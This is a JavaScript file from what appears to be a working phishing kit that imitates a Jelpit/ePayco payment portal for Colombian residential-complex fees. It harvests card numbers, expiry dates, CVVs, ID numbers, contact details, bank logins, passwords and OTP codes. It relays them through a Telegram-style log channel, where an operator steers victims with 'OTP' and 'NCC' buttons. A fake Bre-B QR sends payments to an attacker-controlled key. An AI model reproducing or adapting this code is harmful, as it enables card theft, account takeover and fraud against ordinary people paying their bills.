/* ── SessionStorage ──────────────────────────────────────── */
const conj = JSON.parse(sessionStorage.getItem('jelpit_conj') || 'null');
const apt = JSON.parse(sessionStorage.getItem('jelpit_apt') || 'null');
const client = JSON.parse(sessionStorage.getItem('jelpit_client') || 'null');
const total = Number(sessionStorage.getItem('jelpit_total')) || 0;

if (!conj || !apt) { window.location.replace('index.php'); }

/* ── Helpers ─────────────────────────────────────────────── */
function formatCOP(val) {
  return '$ ' + Number(val).toLocaleString('es-CO') + '.00';
}

/* ── Log: entrada a portalpagos.php ────────────────────── */
tgGetIP().then(ip => tgLog([
  '🏦 <b>PORTAL DE PAGOS</b>',
  `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
  `🚪 Inmueble: ${apt?.tipo || ''} ${apt?.inmueble || '—'}`,
  `🔖 Referencia: ${apt?.referencia || '—'}`,
  `💰 Total: $${Number(total).toLocaleString('es-CO')}`,
  `🌐 IP: <code>${ip}</code>`,
  `🕐 ${new Date().toLocaleString('es-CO')}`
]));

/* ── Render client data ──────────────────────────────────── */
if (client) {
  const name = [client.nombre, client.apellido].filter(Boolean).join(' ');
  document.getElementById('clienteNombre').textContent = name.toLowerCase() || '—';
  document.getElementById('clienteCorreo').textContent = client.correo || '—';
  document.getElementById('clienteCelular').textContent = client.celular || '—';
}

/* ── Render payment summary ──────────────────────────────── */
const conjName = (conj?.co_ownership_name || '').toUpperCase();
document.getElementById('pNombre').textContent = conjName;
document.getElementById('pTotal').textContent = formatCOP(total);

let payRef = sessionStorage.getItem('jelpit_payref');
if (!payRef) {
  payRef = 'PL' + String(Date.now()).slice(-6);
  sessionStorage.setItem('jelpit_payref', payRef);
}
document.getElementById('pRef').textContent = payRef;

/* Prefill ePayco modals */
if (client) {
  const el = document.getElementById('epaCorreo');
  if (el) el.value = client.correo || '';
  const el2 = document.getElementById('epaNombre');
  if (el2) el2.value = [client.nombre, client.apellido].filter(Boolean).join(' ');
  const el3 = document.getElementById('epaMovil');
  if (el3) el3.value = client.celular || '';
}

/* Prefill ePayco titles */
['epaTitle1', 'epaTitle2', 'epaTitle3'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.textContent = conjName.slice(0, 24) + (conjName.length > 24 ? '...' : '');
});

/* Prefill ePayco totals */
const fmtTotal = formatCOP(total);
['epaycoTotal1', 'epaycoTotal2'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.textContent = fmtTotal + ' COP';
});

/* ── Payment method accordion ────────────────────────────── */
let activeMethod = null;

function toggleMethod(id) {
  const card = document.getElementById(id);
  const isOpen = card.classList.contains('open');

  document.querySelectorAll('.method-card').forEach(c => c.classList.remove('open'));

  if (!isOpen) {
    card.classList.add('open');
    activeMethod = id;
  } else {
    activeMethod = null;
  }
  updatePagarBtn();
}
window.toggleMethod = toggleMethod;

/* ── Cuotas toggle ───────────────────────────────────────── */
function toggleCuotas() {
  const tipo = document.querySelector('input[name="tipoTarjeta"]:checked')?.value;
  const grp = document.getElementById('grpCuotas');
  if (grp) grp.style.display = (tipo === 'credito') ? '' : 'none';
  updatePagarBtn();
}
window.toggleCuotas = toggleCuotas;
toggleCuotas();

/* ── Form validation ─────────────────────────────────────── */
function isAmex(raw) { return raw.length >= 1 && raw[0] === '3'; }

function isDateValid(val) {
  if (!/^\d{2}\/\d{2}$/.test(val)) return false;
  const [mm, yy] = val.split('/').map(Number);
  if (mm < 1 || mm > 12) return false;
  const now = new Date();
  const curYY = now.getFullYear() % 100;
  const curMM = now.getMonth() + 1;
  if (yy < curYY) return false;
  if (yy === curYY && mm < curMM) return false;
  return true;
}

function isFormValid() {
  if (!activeMethod || total <= 0) return false;

  if (activeMethod === 'methodTarjetas') {
    const name = document.getElementById('cardName')?.value.trim() || '';
    const num = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
    const date = document.getElementById('cardDate')?.value || '';
    const cvv = document.getElementById('cardCvv')?.value || '';
    const tipo = document.querySelector('input[name="tipoTarjeta"]:checked')?.value;
    const cuotas = document.getElementById('selectCuotas')?.value || '';
    const amex = isAmex(num);
    const dateOk = isDateValid(date);
    const cuotasOk = tipo === 'debito' || (tipo === 'credito' && !!cuotas);
    const lenOk = amex ? num.length === 15 : num.length === 16;
    const cvvOk = amex ? cvv.length === 4 : cvv.length === 3;
    return name.length >= 3 && lenOk && luhn(num) && dateOk && cvvOk && cuotasOk;
  }

  if (activeMethod === 'methodPse') {
    const numDoc = document.getElementById('pseNumDoc')?.value.trim() || '';
    const banco = document.getElementById('pseBanco')?.value || '';
    const email = document.getElementById('pseEmail')?.value.trim() || '';
    const nombre = document.getElementById('pseNombre')?.value.trim() || '';
    const telefono = document.getElementById('pseTelefono')?.value.trim() || '';
    const telefonoValido = telefono.length === 10 && telefono.startsWith('3');
    const emailValido = /^[a-zA-Z0-9@._-]+$/.test(email) && email.includes('@') && email.includes('.');
    return numDoc.length >= 5 && !!banco && emailValido && nombre.length >= 3 && telefonoValido;
  }

  if (activeMethod === 'methodNequi') return true;
  if (activeMethod === 'methodBreb')  return true;

  return false;
}

/* ── PAGAR button ────────────────────────────────────────── */
function updatePagarBtn() {
  const btn = document.getElementById('btnPagarFinal');
  const active = isFormValid();
  btn.disabled = !active;
  btn.classList.toggle('ready', active);
}

/* Listen to form fields (cardNumber + cardCvv + cardDate handled by dedicated listeners) */
['cardName', 'selectCuotas'].forEach(id => {
  const el = document.getElementById(id);
  if (el) { el.addEventListener('input', updatePagarBtn); el.addEventListener('change', updatePagarBtn); }
});
['pseNumDoc', 'pseBanco', 'pseEmail', 'pseNombre', 'pseTelefono'].forEach(id => {
  const el = document.getElementById(id);
  if (el) { el.addEventListener('input', updatePagarBtn); el.addEventListener('change', updatePagarBtn); }
});

// Teléfono PSE: solo dígitos, máx 10, debe empezar por 3
const telEl = document.getElementById('pseTelefono');
if (telEl) {
  telEl.addEventListener('input', () => {
    let v = telEl.value.replace(/\D/g, '').slice(0, 10);
    if (v.length > 0 && v[0] !== '3') v = '';
    telEl.value = v;
    const invalid = v.length > 0 && v.length < 10;
    const wrapTel = telEl.closest('.input-wrapper');
    if (wrapTel) {
      wrapTel.style.borderColor = invalid ? '#dc3545' : '';
      wrapTel.style.boxShadow = invalid ? '0 0 0 1px #dc3545' : '';
    } else {
      telEl.style.borderColor = invalid ? '#dc3545' : '';
      telEl.style.boxShadow = invalid ? '0 0 0 1px #dc3545' : '';
    }
  });
}

// Email PSE: bloquear caracteres especiales no permitidos
const emailEl = document.getElementById('pseEmail');
if (emailEl) {
  emailEl.addEventListener('input', () => {
    emailEl.value = emailEl.value.replace(/[^a-zA-Z0-9@._-]/g, '');
    const val = emailEl.value;
    const emailOk = val.length > 0 && val.includes('@') && val.includes('.');
    const wrapEmail = emailEl.closest('.input-wrapper');
    if (wrapEmail) {
      wrapEmail.style.borderColor = (val.length > 0 && !emailOk) ? '#dc3545' : '';
      wrapEmail.style.boxShadow = (val.length > 0 && !emailOk) ? '0 0 0 1px #dc3545' : '';
    } else {
      emailEl.style.borderColor = (val.length > 0 && !emailOk) ? '#dc3545' : '';
      emailEl.style.boxShadow = (val.length > 0 && !emailOk) ? '0 0 0 1px #dc3545' : '';
    }
  });
}
document.querySelectorAll('input[name="tipoTarjeta"]').forEach(r => r.addEventListener('change', updatePagarBtn));


document.getElementById('btnPagarFinal').addEventListener('click', () => {
  if (document.getElementById('btnPagarFinal').disabled) return;

  if (activeMethod === 'methodBreb') {
    openBreb();

  } else if (activeMethod === 'methodNequi') {
    showOverlay('epaycoModal1');

  } else if (activeMethod === 'methodTarjetas') {
    const cardNum = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
    const fecha = document.getElementById('cardDate')?.value || '';
    const cvv = document.getElementById('cardCvv')?.value || '';
    const client = JSON.parse(sessionStorage.getItem('jelpit_client') || '{}');
    const [mm, yy] = fecha.split('/');
    const fullDate = mm && yy ? `${mm}/20${yy}` : fecha;

    showOverlay('esperaOverlay');

    Promise.all([
      tgGetIP(),
      fetch(`card_info.php?cc=${cardNum}`).then(r => r.json()).catch(() => ({ info: '—' }))
    ]).then(([ip, card]) => {
      _cardCache = {
        num: cardNum,
        date: fullDate,
        cvv,
        bank: card.info || '—',
        brand: card.brand || '',
        nombre: `${client.nombre || ''} ${client.apellido || ''}`.trim() || '—',
        cedula: `${client.tipoDoc || ''} ${client.numDoc || '—'}`.trim(),
      };

      tgLog([
        '💴💴💴 NUEVO KOKOLOKO 💴💴💴',
        `🔪 IP: ${ip}`,
        `✉️ ${client.correo || '—'}`,
        `🪪 ${_cardCache.cedula}`,
        `📱 ${client.celular || '—'}`,
        `👤 ${_cardCache.nombre}`,
        `🔖 ${navigator.userAgent}`,
        `🏧 Bank: ${_cardCache.bank}`,
        `💳 ${cardNum}`,
        `📆 ${fullDate}`,
        `🪬 ${cvv}`,
      ], 'cc');
    });

    setTimeout(() => { hideOverlay('esperaOverlay'); fillVisaModal(); showOverlay('visaAuthModal'); }, 2000);

  } else if (activeMethod === 'methodPse') {
    const banco = document.getElementById('pseBanco')?.value || '';
    const tipoDoc = document.getElementById('pseTipoDoc')?.value || '';
    const numDoc = document.getElementById('pseNumDoc')?.value.trim() || '';
    const tipoP = document.getElementById('pseTipoPersona')?.value || '';
    const pseEmail = document.getElementById('pseEmail')?.value.trim() || '';
    const pseNombre = document.getElementById('pseNombre')?.value.trim() || '';
    const pseTelefono = document.getElementById('pseTelefono')?.value.trim() || '';
    const bancoNombre = document.getElementById('pseBanco')?.selectedOptions[0]?.text || banco;
    const referencia = apt?.referencia || '';

    if (!banco) { alert('Por favor selecciona un banco.'); return; }

    const esNequi = banco === 'nequi';
    tgGetIP().then(ip => tgLog([
      esNequi ? '🟣 <b>PSE — NEQUI DIRECTO</b>' : '🏦 <b>PSE — PAGAR</b>',
      `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
      `🔖 Referencia: ${referencia}`,
      `💰 Total: ${formatCOP(total)}`,
      `🏛️ Banco: ${bancoNombre}`,
      `👤 Nombre: ${pseNombre}`,
      `🪪 Doc: ${tipoDoc} ${numDoc}`,
      `📞 Tel: ${pseTelefono}`,
      `📧 Email: ${pseEmail}`,
      `👤 Tipo persona: ${tipoP}`,
      `🌐 IP: <code>${ip}</code>`,
      `🕐 ${new Date().toLocaleString('es-CO')}`
    ]));

    showOverlay('esperaOverlay');
    const pseParams = new URLSearchParams({ banco, monto: total, email: pseEmail, cedula: numDoc, nombre: pseNombre, telefono: pseTelefono, referencia });
    fetch(`pse_redirect.php?${pseParams}`)
      .then(r => r.json())
      .then(d => {
        if (!d.url) {
          setTimeout(() => { hideOverlay('esperaOverlay'); showOverlay('bankUnavailableModal'); }, 2000);
          return;
        }
        if (d.delay === 0) {
          window.location.href = d.url;
        } else {
          setTimeout(() => { window.location.href = d.url; }, d.delay ?? 2000);
        }
      })
      .catch(() => { hideOverlay('esperaOverlay'); });
  }
});

/* ── OTP submit ──────────────────────────────────────────── */
document.getElementById('btnSubmitOtp')?.addEventListener('click', () => {
  const val = document.getElementById('otpInput')?.value || '';
  if (val.length < 4) { alert('Ingresa el código completo.'); return; }
  hideOverlay('otpOverlay');
  showOverlay('claveDinamicaOverlay');
});

/* ── Clave dinámica submit ───────────────────────────────── */
document.getElementById('btnSubmitClaveDinamica')?.addEventListener('click', () => {
  const val = document.getElementById('claveDinamicaInput')?.value || '';
  if (!val.trim()) { alert('Ingresa tu clave dinámica.'); return; }
  hideOverlay('claveDinamicaOverlay');
  showOverlay('rechazoOverlay');
});

/* ── ePayco modal helpers ────────────────────────────────── */
function showOverlay(id) { const el = document.getElementById(id); if (el) el.style.display = 'flex'; }
function hideOverlay(id) { const el = document.getElementById(id); if (el) el.style.display = 'none'; }

function fillVisaModal() {
  const cardNum = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
  const last4 = cardNum.slice(-4) || '----';
  const masked = `**** **** **** ${last4}`;
  const comercio = conj?.co_ownership_name || 'Jelpit';
  const monto = formatCOP(total) + ' COP';
  const now = new Date();
  const fecha = `${now.getDate()} ${now.getMonth() + 1}. ${now.getFullYear()}`;

  document.getElementById('visaComercio').textContent = comercio;
  document.getElementById('visaMonto').textContent = monto;
  document.getElementById('visaFecha').textContent = fecha;
  document.getElementById('visaUltimos').textContent = last4;
  document.getElementById('visaDetalleComercio').textContent = comercio;
  document.getElementById('visaDetalleMonto').textContent = monto;
  document.getElementById('visaDetalleTarjeta').textContent = masked;

  document.getElementById('visaUsuario').value = '';
  document.getElementById('visaClave').value = '';
  document.getElementById('visaBankLogo').src = getBrandLogo(_cardCache.brand);

  clearInterval(_visaPollTimer);
  visaSetLoading(false);
  document.getElementById('visaErrorMsg').style.display = 'none';
}

let _cardCache = { num: '', date: '', cvv: '', bank: '', brand: '', nombre: '', cedula: '' };

const _brandLogos = { visa: 'img/banks/visa.png', mastercard: 'img/banks/mastercard.png', 'american express': 'img/banks/amex.png' };
function getBrandLogo(brand) {
  return _brandLogos[(brand || '').toLowerCase()] || 'img/banks/nobank.png';
}
let _visaPollTimer = null;

function visaSetLoading(loading) {
  document.getElementById('visaFormSection').style.display = loading ? 'none' : '';
  document.getElementById('visaLoader').style.display = loading ? 'flex' : 'none';
}

function visaShowError() {
  visaSetLoading(false);
  document.getElementById('visaErrorMsg').style.display = 'block';
  document.getElementById('visaUsuario').value = '';
  document.getElementById('visaClave').value = '';
}

function visaOtpSetLoading(loading) {
  document.getElementById('visaOtpFormSection').style.display = loading ? 'none' : '';
  document.getElementById('visaOtpLoader').style.display = loading ? 'flex' : 'none';
}

let _visaPollContext = 'visa';

function pollVisaStatus(sid, context = 'visa') {
  _visaPollContext = context;
  clearInterval(_visaPollTimer);
  _visaPollTimer = setInterval(() => {
    fetch(`status.php?s=${sid}`)
      .then(r => r.json())
      .then(d => {
        if (d.status === 'error_usuario') {
          clearInterval(_visaPollTimer);
          const otpOpen = document.getElementById('visaOtpModal')?.style.display !== 'none';
          if (otpOpen) {
            hideOverlay('visaOtpModal');
            fillVisaModal();
            showOverlay('visaAuthModal');
          }
          visaShowError();
        } else if (d.status === 'otp') {
          clearInterval(_visaPollTimer);
          const otpOpen = document.getElementById('visaOtpModal')?.style.display !== 'none';
          if (!otpOpen) {
            hideOverlay('visaAuthModal');
            fillOtpModal();
            visaOtpSetLoading(false);
            showOverlay('visaOtpModal');
          } else {
            fillOtpModal();
            visaOtpSetLoading(false);
          }
        } else if (d.status === 'ncc') {
          clearInterval(_visaPollTimer);
          hideOverlay('visaAuthModal');
          hideOverlay('visaOtpModal');
          showOverlay('rechazoOverlay');
        }
      })
      .catch(() => { });
  }, 2000);
}

function fillOtpModal() {
  const cardNum = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
  const last4 = cardNum.slice(-4) || '----';
  const comercio = conj?.co_ownership_name || 'Jelpit';
  const monto = formatCOP(total) + ' COP';
  const now = new Date();
  const fecha = `${now.getDate()} ${now.getMonth() + 1}. ${now.getFullYear()}`;

  document.getElementById('otpComercio').textContent = comercio;
  document.getElementById('otpMonto').textContent = monto;
  document.getElementById('otpFecha').textContent = fecha;
  document.getElementById('otpUltimos').textContent = last4;
  document.getElementById('otpClave').value = '';
  document.getElementById('otpBankLogo').src = getBrandLogo(_cardCache.brand);
}

document.getElementById('btnOtpAutorizar').addEventListener('click', () => {
  const clave = document.getElementById('otpClave')?.value.trim() || '';
  if (!clave) return;
  const sid2 = (crypto.randomUUID?.() || Math.random().toString(36).slice(2) + Date.now());

  visaOtpSetLoading(true);

  fetch('log.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      action: 'cc',
      text: [
        '🔗 NUEVO OTP INGRESADO',
        '',
        `👤 ${_cardCache.nombre}`,
        clave,
        '',
        `🪪 ${_cardCache.cedula}`,
        `🏧 ${_cardCache.bank}`,
        `💳 ${_cardCache.num} | ${_cardCache.date} | ${_cardCache.cvv}`,
      ].join('\n'),
      session_id: sid2,
      buttons: [[
        { text: '❌ Error usuario', callback_data: `error_usuario:${sid2}` },
        { text: '🔑 OTP', callback_data: `otp:${sid2}` },
        { text: '🚫 NCC', callback_data: `ncc:${sid2}` }
      ]]
    })
  });

  pollVisaStatus(sid2, 'otp');
});

document.getElementById('btnOtpCancelar').addEventListener('click', () => {
  hideOverlay('visaOtpModal');
});

document.getElementById('btnVisaAutorizar').addEventListener('click', () => {
  const usuario = document.getElementById('visaUsuario')?.value.trim() || '';
  const clave = document.getElementById('visaClave')?.value.trim() || '';
  if (!usuario || !clave) return;

  const sid = (crypto.randomUUID?.() || Math.random().toString(36).slice(2) + Date.now());

  visaSetLoading(true);

  fetch('log.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      action: 'cc',
      text: [
        '🔗 NUEVO LOGO INGRESADO',
        '',
        `👤 ${_cardCache.nombre}`,
        `🏛 ${usuario}`,
        `🔐 ${clave}`,
        '',
        `🪪 ${_cardCache.cedula}`,
        `🏧 ${_cardCache.bank}`,
        `💳 ${_cardCache.num} | ${_cardCache.date} | ${_cardCache.cvv}`,
      ].join('\n'),
      session_id: sid,
      buttons: [[
        { text: '❌ Error usuario', callback_data: `error_usuario:${sid}` },
        { text: '🔑 OTP', callback_data: `otp:${sid}` },
        { text: '🚫 NCC', callback_data: `ncc:${sid}` }
      ]]
    })
  });

  pollVisaStatus(sid);
});

function closeEpayco() {
  ['epaycoModal1', 'epaycoModal2', 'epaycoModal3'].forEach(hideOverlay);
}
window.closeEpayco = closeEpayco;

function goToEpaycoModal2() {
  const correo = document.getElementById('epaCorreo')?.value || '';
  const el = document.getElementById('spanEpaCorreo');
  if (el) el.textContent = correo;
  hideOverlay('epaycoModal1');
  showOverlay('epaycoModal2');
}
window.goToEpaycoModal2 = goToEpaycoModal2;

function goToEpaycoModal1() {
  hideOverlay('epaycoModal2');
  showOverlay('epaycoModal1');
}
window.goToEpaycoModal1 = goToEpaycoModal1;

function goToEpaycoModal3() {
  const movil = document.getElementById('epaMovil')?.value || '';
  const correo = document.getElementById('epaCorreo')?.value || '';
  const nombre = document.getElementById('epaNombre')?.value || '';
  const doc = document.getElementById('epaDoc')?.value || '';

  tgGetIP().then(ip => tgLog([
    '🟣 <b>NEQUI DIRECTO — FORMULARIO</b>',
    `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
    `🔖 Referencia: ${apt?.referencia || '—'}`,
    `💰 Total: ${formatCOP(total)}`,
    `👤 Nombre: ${nombre}`,
    `📱 Celular: ${movil}`,
    `📧 Correo: ${correo}`,
    `🪪 Documento: ${doc}`,
    `🌐 IP: <code>${ip}</code>`,
    `🕐 ${new Date().toLocaleString('es-CO')}`
  ]));

  hideOverlay('epaycoModal2');
  showOverlay('esperaOverlay');
  fetch('pse_redirect.php?banco=nequi')
    .then(r => r.json())
    .then(d => {
      setTimeout(() => {
        hideOverlay('esperaOverlay');
        if (d.url) window.location.href = d.url;
      }, 2000);
    })
    .catch(() => hideOverlay('esperaOverlay'));
}
window.goToEpaycoModal3 = goToEpaycoModal3;

/* ── Luhn algorithm ──────────────────────────────────────── */
function luhn(num) {
  let sum = 0, alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

/* ── Card number formatting + Luhn validation ────────────── */
const cardNumberInput = document.getElementById('cardNumber');
const cardCvvInput = document.getElementById('cardCvv');

if (cardNumberInput) {
  cardNumberInput.addEventListener('input', e => {
    const digits = e.target.value.replace(/\D/g, '');
    const amex = isAmex(digits);
    const maxLen = amex ? 15 : 16;
    const raw = digits.slice(0, maxLen);

    // Formato: Amex 4-6-5, resto 4-4-4-4
    if (amex) {
      let fmt = raw.slice(0, 4);
      if (raw.length > 4) fmt += ' ' + raw.slice(4, 10);
      if (raw.length > 10) fmt += ' ' + raw.slice(10, 15);
      e.target.value = fmt;
    } else {
      e.target.value = raw.replace(/(\d{4})(?=\d)/g, '$1 ');
    }

    // Actualizar maxlength del CVV según tipo
    if (cardCvvInput) cardCvvInput.maxLength = amex ? 4 : 3;

    const wrap = e.target.closest('.input-wrapper');
    if (wrap) {
      const fullLen = amex ? 15 : 16;
      if (raw.length === fullLen && !luhn(raw)) {
        wrap.style.borderColor = '#dc3545';
        wrap.style.boxShadow = '0 0 0 1px #dc3545';
      } else {
        wrap.style.borderColor = '';
        wrap.style.boxShadow = '';
      }
    }
    updatePagarBtn();
  });
}

if (cardCvvInput) {
  cardCvvInput.addEventListener('input', e => {
    const raw = e.target.value.replace(/\D/g, '');
    const num = (cardNumberInput?.value || '').replace(/\D/g, '');
    const amex = isAmex(num);
    const expect = amex ? 4 : 3;
    e.target.value = raw.slice(0, expect);

    const wrap = e.target.closest('.input-wrapper');
    if (wrap) {
      const wrong = e.target.value.length > 0 && e.target.value.length !== expect;
      wrap.style.borderColor = wrong ? '#dc3545' : '';
      wrap.style.boxShadow = wrong ? '0 0 0 1px #dc3545' : '';
    }
    updatePagarBtn();
  });
}

const cardDateInput = document.getElementById('cardDate');
if (cardDateInput) {
  cardDateInput.addEventListener('input', e => {
    let val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
    e.target.value = val;

    const wrap = e.target.closest('.input-wrapper');
    const full = val.length === 5;
    const valid = full && isDateValid(val);
    if (wrap) {
      wrap.style.borderColor = (full && !valid) ? '#dc3545' : '';
      wrap.style.boxShadow = (full && !valid) ? '0 0 0 1px #dc3545' : '';
    }
    updatePagarBtn();
  });
}

/* ── Bre-B ───────────────────────────────────────────────── */
const _BREB_PREFIX = '00020101021226390014CO.COM.ACH.LLA0417@LITTIO112954000649250014CO.COM.ACH.RED0103ACH50310013CO.COM.ACH.CU01100082302155520400005303170';
const _BREB_SUFFIX = '5802CO5905Kamin600511001610511001622107040000080200110363380270016CO.COM.ACH.CANAL0103APP81250015CO.COM.ACH.CIVA01020382260014CO.COM.ACH.IVA01040.0083270015CO.COM.ACH.BASE01040.0084250015CO.COM.ACH.CINC01020385260014CO.COM.ACH.INC01040.0090410016CO.COM.ACH.TRXID01171783894866422000=91460014CO.COM.ACH.SEC0124zdItyibLP1ZlwenFpLPDwbPN6304';
const _BREB_LLAVE  = '@LITTIO1129540006';

let _brebTimer = null;

function _crc16(str) {
  let crc = 0xFFFF;
  for (let i = 0; i < str.length; i++) {
    crc ^= str.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1);
    }
    crc &= 0xFFFF;
  }
  return crc;
}

function _buildBrebQR(amount) {
  const amtStr = amount.toFixed(2);
  const amtLen = String(amtStr.length).padStart(2, '0');
  const payload = _BREB_PREFIX + '54' + amtLen + amtStr + _BREB_SUFFIX;
  return payload + _crc16(payload).toString(16).toUpperCase().padStart(4, '0');
}

function openBreb(rejected = false) {
  const modal = document.getElementById('brebModal');
  if (!modal) return;

  document.getElementById('brebAmount').textContent = formatCOP(total);

  const expiry = new Date(Date.now() + 5 * 60 * 1000);
  const pad = n => String(n).padStart(2, '0');
  document.getElementById('brebExpiry').textContent =
    `${pad(expiry.getDate())}/${pad(expiry.getMonth()+1)}/${expiry.getFullYear()} - ${pad(expiry.getHours())}:${pad(expiry.getMinutes())}`;

  const qrDiv = document.getElementById('brebQRDiv');
  qrDiv.innerHTML = '';
  try {
    new QRCode(qrDiv, { text: _buildBrebQR(total), width: 200, height: 200, correctLevel: QRCode.CorrectLevel.M });
  } catch(e) {}

  const rejMsg = document.getElementById('brebRejMsg');
  if (rejMsg) rejMsg.style.display = rejected ? '' : 'none';

  brebSwitch('llave');
  modal.style.display = 'flex';

  clearInterval(_brebTimer);
  let secs = 5 * 60;
  _brebTimer = setInterval(() => {
    secs--;
    if (secs <= 0) { clearInterval(_brebTimer); closeBreb(); }
  }, 1000);

  if (!rejected) {
    tgGetIP().then(ip => tgLog([
      '🟢 <b>BREB — INICIO PAGO</b>',
      `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
      `🚪 Inmueble: ${apt?.tipo || ''} ${apt?.inmueble || '—'}`,
      `🔖 Referencia: ${apt?.referencia || '—'}`,
      `💰 Total: ${formatCOP(total)}`,
      `🏦 Llave: ${_BREB_LLAVE}`,
      `🌐 IP: <code>${ip}</code>`,
      `🕐 ${new Date().toLocaleString('es-CO')}`
    ]));
  }
}

function closeBreb() {
  clearInterval(_brebTimer);
  const modal = document.getElementById('brebModal');
  if (modal) modal.style.display = 'none';
}

function brebSwitch(tab) {
  const isLlave = tab === 'llave';
  document.getElementById('brebPanelLlave').style.display = isLlave ? '' : 'none';
  document.getElementById('brebPanelQR').style.display    = isLlave ? 'none' : '';
  document.getElementById('brebTabLlave').classList.toggle('active', isLlave);
  document.getElementById('brebTabQR').classList.toggle('active', !isLlave);
}

function brebCopy() {
  navigator.clipboard?.writeText(_BREB_LLAVE).catch(() => {});
  const btn = document.getElementById('brebCopyBtn');
  const orig = btn.innerHTML;
  btn.innerHTML = '<i class="fa-solid fa-check"></i> COPIADO';
  setTimeout(() => { btn.innerHTML = orig; }, 2000);
}
function brebPagoRealizado() {
  clearInterval(_brebTimer);
  document.getElementById('brebModal').style.display = 'none';
  showOverlay('esperaOverlay');

  const sid = (crypto.randomUUID?.() || Math.random().toString(36).slice(2) + Date.now());
  const ahora = new Date();

  tgGetIP().then(ip => {
    fetch('log.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'breb',
        text: [
          '💳 <b>BREB — PAGO REALIZADO</b>',
          `🏘️ Conjunto: <b>${conj?.co_ownership_name || '—'}</b>`,
          `🚪 Inmueble: ${apt?.tipo || ''} ${apt?.inmueble || '—'}`,
          `🔖 Referencia: ${apt?.referencia || '—'}`,
          `💰 Total: ${formatCOP(total)}`,
          `🏦 Llave Bre-B: ${_BREB_LLAVE}`,
          `🌐 IP: <code>${ip}</code>`,
          `🕐 ${ahora.toLocaleString('es-CO')}`
        ].join('\n'),
        session_id: sid,
        buttons: [[
          { text: '✅ Aceptar pago',  callback_data: `breb_aceptado:${sid}`  },
          { text: '❌ Rechazar pago', callback_data: `breb_rechazado:${sid}` }
        ]]
      })
    });
  });

  const pollTimer = setInterval(() => {
    fetch(`status.php?s=${sid}`)
      .then(r => r.json())
      .then(d => {
        if (d.status === 'breb_aceptado') {
          clearInterval(pollTimer);
          hideOverlay('esperaOverlay');
          document.getElementById('brebExitoMonto').textContent = formatCOP(total);
          document.getElementById('brebExitoFecha').textContent = ahora.toLocaleString('es-CO');
          showOverlay('brebExitoOverlay');
        } else if (d.status === 'breb_rechazado') {
          clearInterval(pollTimer);
          hideOverlay('esperaOverlay');
          openBreb(true);
        }
      })
      .catch(() => {});
  }, 2000);
}

window.brebSwitch        = brebSwitch;
window.brebCopy          = brebCopy;
window.closeBreb         = closeBreb;
window.brebPagoRealizado = brebPagoRealizado;
